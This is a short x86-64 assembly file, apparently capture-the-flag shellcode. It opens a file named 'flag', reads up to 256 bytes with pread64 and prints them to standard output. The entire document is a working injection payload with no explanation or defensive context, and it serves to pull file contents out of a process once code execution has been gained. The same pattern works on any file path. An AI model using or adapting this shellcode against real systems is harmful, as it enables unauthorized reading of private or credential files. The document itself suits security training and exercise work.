BITS 64
global _start

_start:

    push   0x67616c66
    push   rsp
    pop    rdi
    mov    rax,0x2
    syscall

    sub    rsp,0x100
    mov    rsi,rsp
    mov    rdi,rax
    mov    rdx,0x100
    mov    r10,0x0
    mov    rax,0x11
    syscall

    mov    rax,0x1
    mov    rdi,0x1
    mov    rsi,rsp
    mov    rdx,0x100
    syscall